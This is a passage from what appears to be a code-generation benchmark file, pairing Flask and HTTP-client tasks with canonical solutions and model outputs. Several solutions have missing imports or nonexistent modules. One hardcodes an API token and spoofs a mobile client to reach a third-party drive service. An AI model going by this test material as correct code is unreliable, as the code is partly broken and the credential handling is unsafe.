    "right_result": "from flask import Flask, request, jsonify, redirect, abort\nimport re\nfrom typing import Union, Any\nfrom werkzeug.middleware.proxy_fix import ProxyFix\nfrom werkzeug.middleware.gzipper import GzipMiddleware\nfrom werkzeug.middleware.proxy_fix import ProxyFix\nfrom werkzeug.utils import secure_filename\nimport os\nimport time\nimport hashlib\nimport logging\nfrom prometheus_client import start_http_server, Histogram, Counter\nimport requests\nimport shutil\nimport tempfile\nimport tarfile\nimport uuid\n\napp = Flask(__name__)\napp.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1)\napp.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB\napp.config['UPLOAD_FOLDER'] = 'uploads'\napp.config['BLUEPRINTS_FOLDER'] = 'blueprints'\n\n# Ensure upload and blueprint directories exist\nos.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)\nos.makedirs(app.config['BLUEPRINTS_FOLDER'], exist_ok=True)\n\n# Metrics\nrequest_count = Counter('request_count', 'Total number of requests')\nrequest_duration = Histogram('request_duration_seconds', 'Duration of requests in seconds')\nbandwidth_used = Histogram('bandwidth_used_bytes', 'Bandwidth used in bytes')\n\n# Regex pattern for browser user agents\nbrowser_pattern = re.compile(r'MSIE|Trident|Edge|Firefox|Chrome|Safari|Opera|Netscape')\n\ndef _validate_secret(secret: str) -> None:\n    if not (400 <= len(secret) <= 4096):\n        abort(400, description=\"Secret must be between 400 and 4096 characters\")\n\ndef _validate_name(name: str) -> None:\n    if not (3 <= len(name) <= 64):\n        abort(400, description=\"Name must be between 3 and 64 characters\")\n    if not name.isalnum():\n        abort(400, description=\"Name must be alphanumeric\")\n\ndef _validate_sha(sha: str) -> None:\n    if not (40 <= len(sha) <= 40):\n        abort(400, description=\"SHA must be exactly 40 characters\")\n    if not re.match(r'^[a-fA-F0-9]+$', sha):\n        abort(400, description=\"Invalid SHA format\")\n\ndef _server() -> str:\n    return f\"{request.host_url.rstrip('/')}/\"\n\ndef _blueprint(secret: str, name: str) -> Union[Blueprint, None, bool]:\n    # Placeholder for actual blueprint retrieval logic\n    return None\n\nclass BlueprintServer:\n    def __init__(self):\n        self.app = app\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.app.route('/blueprints/<secret>/<name>', methods=['GET'])\n        def get_blueprint(secret: str, name: str):\n            request_count.inc()\n            start_time = time.time()\n            try:\n                _validate_secret(secret)\n                _validate_name(name)\n                blueprint = _blueprint(secret, name)\n                if blueprint is None:\n                    abort(404, description=\"Blueprint not found\")\n                if blueprint.get('exists'):\n                    return jsonify(blueprint), 200\n                else:\n                    return jsonify({'error': 'Blueprint not found'}), 404\n            except Exception as e:\n                logging.error(str(e))\n                return jsonify({'error': str(e)}), 500\n            finally:\n                duration = time.time() - start_time\n                request_duration.observe(duration)\n                bandwidth_used.observe(len(request.data))\n\n        @self.app.route('/blueprints/<secret>/<name>', methods=['PUT'])\n        def put_blueprint(secret: str, name: str):\n            request_count.inc()\n            start_time = time.time()\n            try:\n                _validate_secret(secret)\n                _validate_name(name)\n                data = request.json\n                if not data:\n                    abort(400, description=\"No data provided\")\n                # Placeholder for actual blueprint storage logic\n                return jsonify({'status': 'Blueprint stored'}), 202\n            except Exception as e:\n                logging.error(str(e))\n                return jsonify({'error': str(e)}), 500\n            finally:\n                duration = time.time() - start_time\n                request_duration.observe(duration)\n                bandwidth_used.observe(len(request.data))\n\n        @self.app.route('/blueprints/<secret>/<name>/<sha>', methods=['GET'])\n        def get_tarball(secret: str, name: str, sha: str):\n            request_count.inc()\n            start_time = time.time()\n            try:\n                _validate_secret(secret)\n                _validate_name(name)\n                _validate_sha(sha)\n                # Placeholder for actual tarball retrieval logic\n                return redirect(f\"{_server()}/blueprints/{secret}/{name}/{sha}\", code=301)\n            except Exception as e:\n                logging.error(str(e))\n                return jsonify({'error': str(e)}), 500\n            finally:\n                duration = time.time() - start_time\n                request_duration.observe(duration)\n                bandwidth_used.observe(len(request.data))\n\n        @self.app.route('/blueprints/<secret>/<name>/<sha>', methods=['PUT'])\n        def put_tarball(secret: str, name: str, sha: str):\n            request_count.inc()\n            start_time = time.time()\n            try:\n                _validate_secret(secret)\n                _validate_name(name)\n                _validate_sha(sha)\n                file = request.files['file']\n                if not file:\n                    abort(400, description=\"No file provided\")\n                filename = secure_filename(file.filename)\n                file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))\n                # Placeholder for actual tarball storage logic\n                return jsonify({'status': 'Tarball stored'}), 202\n            except Exception as e:\n                logging.error(str(e))\n                return jsonify({'error': str(e)}), 500\n            finally:\n                duration = time.time() - start_time\n                request_duration.observe(duration)\n                bandwidth_used.observe(len(request.data))\n\n        @self.app.route('/blueprints/<secret>/<name>/sh', methods=['GET'])\n        def sh(secret: str, name: str):\n            request_count.inc()\n            start_time = time.time()\n            try:\n                _validate_secret(secret)\n                _validate_name(name)\n                # Placeholder for actual shell script generation logic\n                return jsonify({'status': 'Shell script generated'}), 200\n            except Exception as e:\n                logging.error(str(e))\n                return jsonify({'error': str(e)}), 500\n            finally:\n                duration = time.time() - start_time\n                request_duration.observe(duration)\n                bandwidth_used.observe(len(request.data))\n\n        @self.app.route('/blueprints/<secret>/<name>/user-data', methods=['GET'])\n        def user_data(secret: str, name: str):\n            request_count.inc()\n            start_time = time.time()\n            try:\n                _validate_secret(secret)\n                _validate_name(name)\n                # Placeholder for actual user-data script generation logic\n                return jsonify({'status': 'User-data script generated'}), 200\n            except Exception as e:\n                logging.error(str(e))\n                return jsonify({'error': str(e)}), 500\n            finally:\n                duration = time.time() - start_time\n                request_duration.observe(duration)\n                bandwidth_used.observe(len(request.data))\n\n        @self.app.route('/secrets', methods=['POST'])\n        def secret():\n            request_count.inc()\n            start_time = time.time()\n            try:\n                data = request.json\n                if not data or 'name' not in data:\n                    abort(400, description=\"Missing name in request\")\n                name = data['name']\n                _validate_name(name)\n                secret = uuid.uuid4().hex\n                # Placeholder for actual secret generation logic\n                return jsonify({'secret': secret}), 201\n            except Exception as e:\n                logging.error(str(e))\n                return jsonify({'error': str(e)}), 500\n            finally:\n                duration = time.time() - start_time\n                request_duration.observe(duration)\n                bandwidth_used.observe(len(request.data))\n\n    def run(self):\n        start_http_server(8000)\n        self.app.run(host='0.0.0.0', port=5000, debug=False)"
  },
  {
    "Task_id": 178,
    "Instruction": "Task Description: Create a Flask-based HTTP server to manage color resources with CRUD (Create, Read, Update, Delete) operations. The server should handle JSON data and respond with appropriate JSON responses.\n\nFunction Description: The code implements a RESTful API for managing color resources stored in a JSON file. It provides endpoints to retrieve all colors, get a specific color by name, create a new color, update an existing color, and delete a color.\n\nInput:\n- For GET /colors: No input parameters\n- For GET /colors/<name>: 'name' parameter in URL path\n- For POST /colors: JSON payload with 'name' and 'value' fields\n- For PUT /colors/<name>: 'name' parameter in URL path and JSON payload with optional 'value' field\n- For DELETE /colors/<name>: 'name' parameter in URL path\n\nOutput:\n- For GET /colors: JSON response containing all colors\n- For GET /colors/<name>: JSON response with the specific color or error\n- For POST /colors: JSON response with the created color and HTTP status 201\n- For PUT /colors/<name>: JSON response with the updated color or error\n- For DELETE /colors/<name>: JSON response with the deleted color or error",
    "Canonical_solution": "from flask import Flask, jsonify, request\nimport json\n\ncolors = json.load(file('colors.json', 'r'))\napp = Flask(__name__)\n\n@app.route('/colors', methods = ['GET'])\ndef get_colors():\n    return jsonify( { \"data\" :  colors })\n\n@app.route('/colors/<name>', methods = ['GET'])\ndef get_color(name):\n    for color in colors:\n        if color[\"name\"] == name:\n            return jsonify( color )\n    return jsonify( { 'error' : True } )\n\n@app.route('/colors', methods= ['POST'])\ndef create_color():\n    color = {\n        'name': request.json['name'],\n        'value': request.json['value']\n    }\n    colors.append(color)\n    return jsonify( color ), 201\n\n@app.route('/colors/<name>', methods= ['PUT'])\ndef update_color(name):\n    for color in colors:\n        if color[\"name\"] == name:\n            color['value'] = request.json.get('value', color['value'])\n            return jsonify( color )\n    return jsonify( { 'error' : True } )\n\n@app.route('/colors/<name>', methods=['DELETE'])\ndef delete_color(name):\n    for color in colors:\n        if color[\"name\"] == name:\n            colors.remove(color)\n            return jsonify(color)\n    return jsonify( { 'error' : True } )",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "```python\nfrom flask import Flask, jsonify, request, abort\nimport os\nimport json\n\napp = Flask(__name__)\nCOLORS_FILE = 'colors.json'\n\ndef load_colors():\n    if not os.path.exists(COLORS_FILE):\n        return []\n    with open(COLORS_FILE, 'r') as f:\n        return json.load(f)\n\ndef save_colors(colors):\n    with open(COLORS_FILE, 'w') as f:\n        json.dump(colors, f, indent=2)\n\n@app.route('/colors', methods=['GET'])\ndef get_colors():\n    colors = load_colors()\n    return jsonify(colors)\n\n@app.route('/colors/<name>', methods=['GET'])\ndef get_color(name):\n    colors = load_colors()\n    color = next((c for c in colors if c['name'] == name), None)\n    if color:\n        return jsonify(color)\n    else:\n        abort(404)\n\n@app.route('/colors', methods=['POST'])\ndef create_color():\n    data = request.get_json()\n    name = data.get('name')\n    value = data.get('value')\n    if not name or not value:\n        abort(400)\n    colors = load_colors()\n    for c in colors:\n        if c['name'] == name:\n            abort(400)\n    new_color = {'name': name, 'value': value}\n    colors.append(new_color)\n    save_colors(colors)\n    return jsonify(new_color), 201\n\n@app.route('/colors/<name>', methods=['PUT'])\ndef update_color(name):\n    data = request.get_json()\n    value = data.get('value')\n    colors = load_colors()\n    color = next((c for c in colors if c['name'] == name), None)\n    if not color:\n        abort(404)\n    if value:\n        color['value'] = value\n    save_colors(colors)\n    return jsonify(color)\n\n@app.route('/colors/<name>', methods=['DELETE'])\ndef delete_color(name):\n    colors = load_colors()\n    color = next((c for c in colors if c['name'] == name), None)\n    if not color:\n        abort(404)\n    colors.remove(color)\n    save_colors(colors)\n    return jsonify(color)\n\nif __name__ == '__main__':\n    app.run(debug=True)\n```"
  },
  {
    "Task_id": 179,
    "Instruction": "Task Description: Create a Flask-based HTTP server that handles computation requests, supports CORS, and provides flexible serialization formats with proper error handling and logging capabilities.\n\nClass Description: The Server class encapsulates a Flask application with enhanced exception formatting and provides methods to run the server and handle computation requests through a dedicated API blueprint.\n\nAttributes:\n- app: [FlaskWithExceptionFormatting] - The Flask application instance with custom exception formatting\n- data: [dict] - Data store for the server (optional)\n- port: [int] - The port number the server is running on\n\nMethods:\n- __init__: [Name](data=None, formats=None, authorization=None, allow_profiler=False, profiler_output=None, profile_by_default=False, allow_add=False, logfile=sys.stdout, loglevel='WARNING', log_exception_formatter=None) -> [None] - Initializes the server with configuration options including data storage, serialization formats, authorization, profiling, and logging settings\n- run: [Name](port=6363, retry=False, **kwargs) -> [None] - Starts the Flask server on the specified port with optional retry logic if the port is busy\n\nAdditional Blueprint (api) Methods:\n- compserver: [Name]() -> [Response] - Handles POST, HEAD, and OPTIONS requests for computation, processes incoming data with supported serialization formats, and returns computation results (decorated with CORS support)",
    "Canonical_solution": "from flask import Flask, Blueprint, Response\nfrom flask_cors import cross_origin\nfrom werkzeug.http import parse_options_header\nimport collections\nimport sys\nimport logging\nfrom logging import Formatter\nfrom functools import wraps\nimport traceback\nfrom datetime import datetime\nimport os\nimport socket\nfrom time import time\nfrom warnings import warn\nimport importlib\nfrom blaze import compute, resource\nfrom blaze.compatibility import ExitStack\nfrom .serialization import json, all_formats\nfrom ..expr import Symbol, symbol\n\nclass FlaskWithExceptionFormatting(Flask):\n    def __init__(self, *args, **kwargs):\n        self.log_exception_formatter = kwargs.pop('log_exception_formatter', \n                                                 lambda tb: ''.join(traceback.format_tb(tb)))\n        super(FlaskWithExceptionFormatting, self).__init__(*args, **kwargs)\n\nclass Server:\n    def __init__(self, data=None, formats=None, authorization=None, allow_profiler=False,\n                 profiler_output=None, profile_by_default=False, allow_add=False,\n                 logfile=sys.stdout, loglevel='WARNING', log_exception_formatter=None):\n        app = self.app = FlaskWithExceptionFormatting('blaze.server.server',\n                                                     log_exception_formatter=log_exception_formatter)\n        app.register_blueprint(api,\n                              data=data if data is not None else {},\n                              formats=formats if formats is not None else (json,),\n                              authorization=authorization,\n                              allow_profiler=allow_profiler,\n                              profiler_output=profiler_output,\n                              profile_by_default=profile_by_default,\n                              allow_add=allow_add)\n        self.data = data\n        if logfile:\n            handler = logging.FileHandler(logfile) if isinstance(logfile, (str, bytes)) else logging.StreamHandler(logfile)\n            handler.setFormatter(Formatter('[%(asctime)s %(levelname)s] %(message)s [in %(pathname)s:%(lineno)d]'))\n            handler.setLevel(getattr(logging, loglevel))\n            app.logger.addHandler(handler)\n\n    def run(self, port=6363, retry=False, **kwargs):\n        self.port = port\n        try:\n            self.app.run(port=port, **kwargs)\n        except socket.error:\n            if not retry:\n                raise\n            warn(\"Oops, couldn't connect on port %d.  Is it busy?\" % port)\n            self.run(port=port + 1, retry=retry, **kwargs)\n\napi = Blueprint('api', __name__)\n\n@api.route('/compute', methods=['POST', 'HEAD', 'OPTIONS'])\n@cross_origin(origins='*', methods=['POST', 'HEAD', 'OPTIONS'])\ndef compserver():\n    raw_content_type = flask.request.headers['content-type']\n    content_type, options = parse_options_header(raw_content_type)\n    \n    if content_type not in accepted_mimetypes:\n        return ('Unsupported serialization format %s' % content_type, 415)\n\n    try:\n        serial = _get_format(accepted_mimetypes[content_type])\n    except KeyError:\n        return (\"Unsupported serialization format '%s'\" % content_type, 415)\n\n    try:\n        payload = serial.loads(flask.request.data)\n    except ValueError:\n        return (\"Bad data.  Got %s \" % flask.request.data, 400)\n\n    # Main computation logic here\n    # ... (rest of computation handling code)\n\n    return serial.dumps(response)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nfrom flask_cors import CORS\nimport logging\nimport sys\nimport time\n\nclass FlaskWithExceptionFormatting(Flask):\n    def __init__(self, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        self.logger = logging.getLogger(__name__)\n        self.logger.setLevel(logging.WARNING)\n        handler = logging.StreamHandler(sys.stdout)\n        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')\n        handler.setFormatter(formatter)\n        self.logger.addHandler(handler)\n\nclass Server:\n    def __init__(self, data=None, formats=None, authorization=None, allow_profiler=False, profiler_output=None, profile_by_default=False, allow_add=False, logfile=sys.stdout, loglevel='WARNING', log_exception_formatter=None):\n        self.app = FlaskWithExceptionFormatting(__name__)\n        self.data = data if data is not None else {}\n        self.formats = formats if formats is not None else ['json']\n        self.authorization = authorization\n        self.allow_profiler = allow_profiler\n        self.profiler_output = profiler_output\n        self.profile_by_default = profile_by_default\n        self.allow_add = allow_add\n        self.logfile = logfile\n        self.loglevel = loglevel\n        self.log_exception_formatter = log_exception_formatter\n        self.setup_routes()\n        self.setup_logging()\n\n    def setup_routes(self):\n        self.api = self.app.register_blueprint(self.create_api_blueprint())\n\n    def create_api_blueprint(self):\n        from flask import Blueprint, request, jsonify\n        api = Blueprint('api', __name__)\n\n        @api.route('/compserver', methods=['POST', 'HEAD', 'OPTIONS'])\n        def compserver():\n            try:\n                data = request.get_json()\n                if data is None:\n                    return jsonify({'error': 'Invalid JSON data'}), 400\n                result = self.process_computation(data)\n                return jsonify(result)\n            except Exception as e:\n                error_msg = self.format_exception(e)\n                return jsonify({'error': error_msg}), 500\n\n        return api\n\n    def process_computation(self, data):\n        # Placeholder for actual computation logic\n        return {'result': 'computed data'}\n\n    def format_exception(self, exception):\n        if self.log_exception_formatter:\n            return self.log_exception_formatter(exception)\n        return str(exception)\n\n    def setup_logging(self):\n        logging.basicConfig(filename=self.logfile, level=self.loglevel)\n\n    def run(self, port=6363, retry=False, **kwargs):\n        if retry:\n            while True:\n                try:\n                    self.app.run(port=port, **kwargs)\n                    break\n                except OSError as e:\n                    if e.errno == 98:  # Port in use\n                        port += 1\n                        time.sleep(1)\n                    else:\n                        raise\n        else:\n            self.app.run(port=port, **kwargs)"
  },
  {
    "Task_id": 18,
    "Instruction": "Task Description: Create a Python class that implements a streaming HTTP client capable of handling chunked transfer encoding, with support for both HTTP and HTTPS protocols, proxy configuration, and automatic reconnection logic.\n\nClass Description: The Stream class provides a robust HTTP client implementation for streaming data to a server using chunked transfer encoding. It handles connection management, automatic reconnection, proxy configuration, and SSL/TLS settings. The class is designed to maintain persistent connections and recover from network issues.\n\nAttributes:\n\nmaxtries: int - Maximum number of reconnection attempts\n_tries: int - Current number of reconnection attempts\n_delay: int - Current delay between reconnection attempts\n_closed: bool - Flag indicating if the connection is closed\n_server: str - Target server hostname\n_port: int - Target server port\n_headers: dict - HTTP headers to send with requests\n_url: str - Target URL path\n_ssl_enabled: bool - Flag for HTTPS connection\n_ssl_verification_enabled: bool - Flag for SSL certificate verification\n_conn: HTTPConnection/HTTPSConnection - The connection object\n_bytes: bytes - Buffer for received data\n\nMethods:\n\n__init__: (server, port=80, headers={}, url=\"/\", ssl_enabled=False, ssl_verification_enabled=True) -> None - Initializes the Stream object with connection parameters\nwrite: (data, reconnect_on=(\"\", 200, 502)) -> None - Sends data to the server using chunked transfer encoding\nclose: () -> str/bytes - Closes the connection and returns the server's final response\n_connect: () -> None - Establishes a new connection to the server\n_getresponse: () -> HTTPResponse/bytes - Retrieves the server's response\n_isconnected: () -> bool - Checks if the connection is still active\n_reconnect: () -> None - Attempts to reestablish a lost connection\n_reset_retries: () -> None - Resets reconnection attempt counters\n_get_ssl_context: () -> ssl.SSLContext/None - Creates SSL context based on verification settings\n_get_proxy_config: () -> tuple - Retrieves proxy configuration from environment variables",
    "Canonical_solution": "import http.client\nimport ssl\nimport time\nfrom io import StringIO\nfrom urllib.parse import urlparse, unquote\n\nclass Stream:\n    def __init__(self, server, port=80, headers={}, url=\"/\", ssl_enabled=False, ssl_verification_enabled=True):\n        self.maxtries = 5\n        self._tries = 0\n        self._delay = 1\n        self._closed = False\n        self._server = server\n        self._port = port\n        self._headers = headers\n        self._url = url\n        self._ssl_enabled = ssl_enabled\n        self._ssl_verification_enabled = ssl_verification_enabled\n        self._connect()\n\n    def write(self, data, reconnect_on=(\"\", 200, 502)):\n        if not self._isconnected():\n            response = self._getresponse()\n            if (response == \"\" and \"\" in reconnect_on) or (\n                response and isinstance(response, http.client.HTTPResponse) and response.status in reconnect_on\n            ):\n                self._reconnect()\n            elif response and isinstance(response, http.client.HTTPResponse):\n                raise Exception(\n                    \"Server responded with status code: {status_code}\\nand message: {msg}.\".format(\n                        status_code=response.status, msg=response.read()\n                    )\n                )\n            elif response == \"\":\n                raise Exception(\"Attempted to write but socket was not connected.\")\n\n        try:\n            msg = data\n            msglen = format(len(msg), \"x\")\n            self._conn.sock.setblocking(1)\n            self._conn.send(\n                \"{msglen}\\r\\n{msg}\\r\\n\".format(msglen=msglen, msg=msg).encode(\"utf-8\")\n            )\n            self._conn.sock.setblocking(0)\n        except http.client.socket.error:\n            self._reconnect()\n            self.write(data)\n\n    def _get_ssl_context(self):\n        context = None\n        if not self._ssl_verification_enabled:\n            context = ssl._create_unverified_context()\n        return context\n\n    def _connect(self):\n        server = self._server\n        port = self._port\n        headers = self._headers\n        ssl_enabled = self._ssl_enabled\n        proxy_server, proxy_port, proxy_auth = self._get_proxy_config()\n\n        if proxy_server and proxy_port:\n            if ssl_enabled:\n                context = self._get_ssl_context()\n                self._conn = http.client.HTTPSConnection(proxy_server, proxy_port, context=context)\n            else:\n                self._conn = http.client.HTTPConnection(proxy_server, proxy_port)\n\n            tunnel_headers = None\n            if proxy_auth:\n                tunnel_headers = {\"Proxy-Authorization\": proxy_auth}\n            self._conn.set_tunnel(server, port, headers=tunnel_headers)\n        else:\n            if ssl_enabled:\n                context = self._get_ssl_context()\n                self._conn = http.client.HTTPSConnection(server, port, context=context)\n            else:\n                self._conn = http.client.HTTPConnection(server, port)\n\n        self._conn.putrequest(\"POST\", self._url)\n        self._conn.putheader(\"Transfer-Encoding\", \"chunked\")\n        for header in headers:\n            self._conn.putheader(header, headers[header])\n        self._conn.endheaders()\n        self._conn.sock.setblocking(False)\n        self._bytes = b\"\"\n        self._reset_retries()\n        time.sleep(0.5)\n\n    def close(self):\n        self._reset_retries()\n        self._closed = True\n        try:\n            self._conn.send(\"\\r\\n0\\r\\n\\r\\n\".encode(\"utf-8\"))\n        except http.client.socket.error:\n            return \"\"\n        return self._getresponse()\n\n    def _getresponse(self):\n        self._conn.sock.setblocking(True)\n        response = self._bytes\n        while True:\n            try:\n                _bytes = self._conn.sock.recv(1)\n            except http.client.socket.error:\n                return b\"\"\n            if _bytes == b\"\":\n                break\n            else:\n                response += _bytes\n        self._conn.sock.setblocking(False)\n\n        if response != b\"\":\n            try:\n                response = http.client.HTTPResponse(_FakeSocket(response))\n                response.begin()\n            except:\n                response = b\"\"\n        return response\n\n    def _isconnected(self):\n        if self._closed:\n            return False\n        if self._conn.sock is None:\n            return False\n        try:\n            self._bytes = b\"\"\n            self._bytes = self._conn.sock.recv(1)\n            return False\n        except http.client.socket.error as e:\n            if e.errno == 35 or e.errno == 10035:\n                return True\n            elif e.errno == 54 or e.errno == 10054:\n                return False\n            elif e.errno == 11:\n                return True\n            elif isinstance(e, ssl.SSLError):\n                if e.errno == 2:\n                    return True\n                raise e\n            else:\n                raise e\n\n    def _reconnect(self):\n        if not self._isconnected():\n            try:\n                self._connect()\n            except http.client.socket.error as e:\n                if e.errno == 61 or e.errno == 10061:\n                    time.sleep(self._delay)\n                    self._delay += self._delay\n                    self._tries += 1\n                    if self._tries < self.maxtries:\n                        self._reconnect()\n                    else:\n                        self._reset_retries()\n                        raise e\n                else:\n                    raise e\n        self._closed = False\n\n    def _reset_retries(self):\n        self._tries = 0\n        self._delay = 1\n\n    def _get_proxy_config(self):\n        proxy_server = None\n        proxy_port = None\n        proxy_username = None\n        proxy_password = None\n        proxy_auth = None\n        ssl_enabled = self._ssl_enabled\n\n        if ssl_enabled:\n            proxy = os.environ.get(\"https_proxy\") or os.environ.get(\"HTTPS_PROXY\")\n        else:\n            proxy = os.environ.get(\"http_proxy\") or os.environ.get(\"HTTP_PROXY\")\n\n        no_proxy = os.environ.get(\"no_proxy\") or os.environ.get(\"NO_PROXY\")\n        no_proxy_url = no_proxy and self._server in no_proxy\n\n        if proxy and not no_proxy_url:\n            p = urlparse(proxy)\n            proxy_server = p.hostname\n            proxy_port = p.port\n            proxy_username = p.username\n            proxy_password = p.password\n\n        if proxy_username and proxy_password:\n            username = unquote(proxy_username)\n            password = unquote(proxy_password)\n            proxy_auth = utils.basic_auth(username, password)\n\n        return proxy_server, proxy_port, proxy_auth\n\nclass _FakeSocket(StringIO):\n    def makefile(self, *args, **kwargs):\n        return self",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "right_result": "import http.client\nimport ssl\nimport socket\nimport time\nimport os\n\nclass Stream:\n    def __init__(self, server, port=80, headers={}, url=\"/\", ssl_enabled=False, ssl_verification_enabled=True):\n        self.maxtries = 3\n        self._tries = 0\n        self._delay = 1\n        self._closed = False\n        self._server = server\n        self._port = port\n        self._headers = headers\n        self._url = url\n        self._ssl_enabled = ssl_enabled\n        self._ssl_verification_enabled = ssl_verification_enabled\n        self._conn = None\n        self._bytes = b''\n\n    def write(self, data, reconnect_on=(\"\", 200, 502)):\n        if not self._isconnected():\n            self._connect()\n        if self._closed:\n            self._connect()\n        try:\n            self._conn.send(data)\n        except Exception as e:\n            if self._tries < self.maxtries:\n                self._tries += 1\n                time.sleep(self._delay)\n                self._reconnect()\n                self.write(data, reconnect_on)\n            else:\n                raise e\n\n    def close(self):\n        if not self._closed:\n            self._closed = True\n            response = self._getresponse()\n            self._conn.close()\n            return response.read()\n\n    def _connect(self):\n        self._reset_retries()\n        if self._ssl_enabled:\n            context = self._get_ssl_context()\n            self._conn = http.client.HTTPSConnection(self._server, self._port, context=context)\n        else:\n            self._conn = http.client.HTTPConnection(self._server, self._port)\n        self._conn.request(\"POST\", self._url, b'', self._headers)\n        self._bytes = self._getresponse().read()\n\n    def _getresponse(self):\n        try:\n            return self._conn.getresponse()\n        except socket.error as e:\n            self._reconnect()\n            return self._getresponse()\n\n    def _isconnected(self):\n        return self._conn is not None and self._conn.sock is not None and not self._closed\n\n    def _reconnect(self):\n        if self._tries < self.maxtries:\n            self._tries += 1\n            time.sleep(self._delay)\n            self._connect()\n        else:\n            raise Exception(\"Max reconnection attempts exceeded\")\n\n    def _reset_retries(self):\n        self._tries = 0\n        self._delay = 1\n\n    def _get_ssl_context(self):\n        if self._ssl_verification_enabled:\n            context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)\n            context.check_hostname = True\n            context.verify_mode = ssl.CERT_REQUIRED\n            return context\n        else:\n            context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)\n            context.check_hostname = False\n            context.verify_mode = ssl.CERT_NONE\n            return context\n\n    def _get_proxy_config(self):\n        proxy_host = os.environ.get('HTTP_PROXY_HOST')\n        proxy_port = os.environ.get('HTTP_PROXY_PORT')\n        return (proxy_host, proxy_port)"
  },
  {
    "Task_id": 180,
    "Instruction": "Task Description: Create a Flask-based HTTP server endpoint that handles OAuth token requests for Aliyun Drive by processing refresh tokens, making external API calls, and returning decrypted token data.\n\nFunction Description: The function `oauth_token()` is a Flask route handler that processes POST requests to '/oauth/alipan/token'. It validates the input, makes authenticated requests to an external API, handles the response, and returns either the decrypted token data or an error response.\n\nInput:\n- HTTP POST request with JSON body containing:\n  - refresh_token: [String] - Required refresh token for OAuth authentication\n\nOutput:\n- HTTP Response with:\n  - Status Code: 200 (success) or error code (4xx/5xx)\n  - Body: JSON containing either:\n    - Success: Decrypted token data\n    - Error: Error message describing the failure",
    "Canonical_solution": "import json\nimport requests\nfrom flask import Flask, request, Response\n\napp = Flask(__name__)\nheaders = {\n    \"token\": \"6733b42e28cdba32\",\n    'User-Agent': 'Mozilla/5.0 (Linux; U; Android 9; zh-cn; SM-S908E Build/TP1A.220624.014) AppleWebKit/533.1 (KHTML, like Gecko) Mobile Safari/533.1',\n    'Host': 'api.extscreen.com'\n}\n\n@app.route('/oauth/alipan/token', methods=['POST'])\ndef oauth_token():\n    data = request.get_json()\n    refresh_token = data.get('refresh_token', None)\n    if not refresh_token:\n        return Response(json.dumps({\"error\": \"No refresh_token provided\"}), status=400, mimetype='application/json')\n\n    req_body = {\n        \"refresh_token\": refresh_token\n    }\n\n    timestamp = str(requests.get('http://api.extscreen.com/timestamp', timeout=10).json()['data']['timestamp'])\n    unique_id = uuid.uuid4().hex\n    wifimac = str(random.randint(10**11, 10**12 - 1))\n\n    resp = requests.post(\"http://api.extscreen.com/aliyundrive/v3/token\", data=req_body, headers={**get_params(timestamp, unique_id, wifimac), **headers}, timeout=10)\n    if resp.status_code == 200:\n        resp_data = resp.json()\n        ciphertext = resp_data[\"data\"][\"ciphertext\"]\n        iv = resp_data[\"data\"][\"iv\"]\n\n        token_data = decrypt(ciphertext, iv, timestamp, unique_id, wifimac)\n        token = json.loads(token_data)\n        return Response(json.dumps(token), status=200, mimetype='application/json')\n    else:\n        return Response(resp.content, status=resp.status_code, mimetype='application/json')",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nimport requests\nfrom cryptography.fernet import Fernet\n\napp = Flask(__name__)\n\n# Example key for decryption (should be securely stored)\nKEY = b'your-fernet-key-here'\nFERNET = Fernet(KEY)\n\ndef decrypt_token(encrypted_token):\n    try:\n        return FERNET.decrypt(encrypted_token).decode('utf-8')\n    except Exception as e:\n        return f\"Decryption failed: {str(e)}\"\n\n@app.route('/oauth/alipan/token', methods=['POST'])\ndef oauth_token():\n    data = request.get_json()\n    refresh_token = data.get('refresh_token')\n\n    if not refresh_token:\n        return jsonify({\"error\": \"Missing refresh token\"}), 400\n\n    # Simulate external API call to get new token\n    try:\n        response = requests.post(\n            'https://example.com/oauth/token',\n            data={\n                'grant_type': 'refresh_token',\n                'refresh_token': refresh_token\n            },\n            headers={'Authorization': 'Bearer old_access_token'}\n        )\n        response.raise_for_status()\n        token_data = response.json()\n        encrypted_token = token_data.get('access_token')\n\n        decrypted_token = decrypt_token(encrypted_token)\n        return jsonify({\"token\": decrypted_token}), 200\n    except requests.RequestException as e:\n        return jsonify({\"error\": f\"API request failed: {str(e)}\"}), 500\n    except Exception as e:\n        return jsonify({\"error\": str(e)}), 500\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)"
  },
  {
    "Task_id": 181,
    "Instruction": "Task Description: Create a Flask-based web server that handles image processing requests through two endpoints: one for adjusting brightness/contrast and another for image enhancement.\n\nFunction Description: The server provides two main routes:\n1. '/adjust' - Handles image brightness and contrast adjustments\n2. '/enhance' - Handles image enhancement operations\nEach route supports both GET (returning HTML forms) and POST (processing the submitted data) methods.\n\nInput:\nFor POST requests:\n- '/adjust' endpoint:\n  - the_file: [File] - Image file to process\n  - brightness: [str] - Brightness adjustment value\n  - contrast: [str] - Contrast adjustment value\n- '/enhance' endpoint:\n  - the_file: [File] - Image file to process\n  - amount: [str] - Enhancement amount value\n\nOutput:\nFor GET requests:\n- Returns HTML templates ('adjust.html' or 'enhance.html')\nFor POST requests:\n- Returns processed image data from respective modules (adjust.do_adjust or enhance.do_enhance)",
